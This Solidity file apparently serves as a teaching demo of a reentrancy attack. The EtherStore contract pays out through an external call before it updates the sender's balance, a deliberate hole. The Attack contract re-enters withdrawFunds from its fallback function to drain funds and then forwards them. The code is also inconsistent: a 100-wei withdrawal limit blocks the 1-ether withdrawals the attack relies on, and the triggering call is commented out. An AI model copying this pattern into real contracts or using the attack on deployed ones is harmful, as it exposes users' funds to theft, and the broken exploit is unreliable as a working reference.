pragma solidity ^0.4.23 ;

contract EtherStore{

    uint256 public withdrawLimit = 100 ;

    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    
    
    //存钱
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    //取钱

    function withdrawFunds(uint256 _weiTowithdraw) public {

        require(balances[msg.sender] >= _weiTowithdraw);
        require(_weiTowithdraw <= withdrawLimit);
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiTowithdraw)());
        balances[msg.sender] -= _weiTowithdraw;
        lastWithdrawTime[msg.sender] = now;
        
    }

    
}

contract Attack {

    EtherStore public etherStore;
    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }
    uint val = 10 ;
    function pwnEtherStore() public payable{
        // require(msg.value >= 1 ether);
        etherStore.depositFunds.value(val*10**18)();
        // etherStore.withdrawFunds(1 ether);

    }

    function collectEther() public{
        msg.sender.transfer(address(this).balance);
    }

    function showThisBalance() public view returns(uint){
        return address(this).balance;
    }
    function() public payable{
        if(address(etherStore).balance >= 1 ether)
            etherStore.withdrawFunds(1 ether);
            
    }
}